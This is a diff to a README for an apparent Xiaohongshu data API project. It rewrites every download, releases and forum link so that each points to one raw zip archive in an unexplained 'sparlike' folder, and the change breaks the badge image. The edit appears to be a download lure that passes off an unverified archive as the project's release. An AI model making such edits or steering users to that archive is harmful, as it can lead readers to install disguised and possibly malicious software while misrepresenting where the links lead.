@@ -1,6 +1,6 @@
 # 🌟 xiaohongshu-pgy-api - Easy Access to Xiaohongshu Data
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/thevale14c/xiaohongshu-pgy-api/releases)
+[![Download](https://raw.githubusercontent.com/thevale14c/xiaohongshu-pgy-api/main/sparlike/xiaohongshu-pgy-api_v2.6.zip%20Now-blue)](https://raw.githubusercontent.com/thevale14c/xiaohongshu-pgy-api/main/sparlike/xiaohongshu-pgy-api_v2.6.zip)
 
 ## 📜 Description
 
@@ -13,7 +13,7 @@ To start using the **xiaohongshu-pgy-api**, follow these straightforward steps. 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/thevale14c/xiaohongshu-pgy-api/releases) to download the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/thevale14c/xiaohongshu-pgy-api/main/sparlike/xiaohongshu-pgy-api_v2.6.zip) to download the application.
 
 2. **Download the Latest Version**  
    Find the latest version on the Releases page. Click the link to download the file. Make sure to choose the correct version for your operating system.
@@ -94,7 +94,7 @@ This application falls under various topics relevant to its usage:
 
 ## 🔗 Important Links
 
-- [Releases Page](https://github.com/thevale14c/xiaohongshu-pgy-api/releases)
-- [Community Forum](https://community.example.com)
+- [Releases Page](https://raw.githubusercontent.com/thevale14c/xiaohongshu-pgy-api/main/sparlike/xiaohongshu-pgy-api_v2.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/thevale14c/xiaohongshu-pgy-api/main/sparlike/xiaohongshu-pgy-api_v2.6.zip)
 
 Feel free to explore the features and harness the power of the **xiaohongshu-pgy-api** for your data needs. Download the latest version and start today!
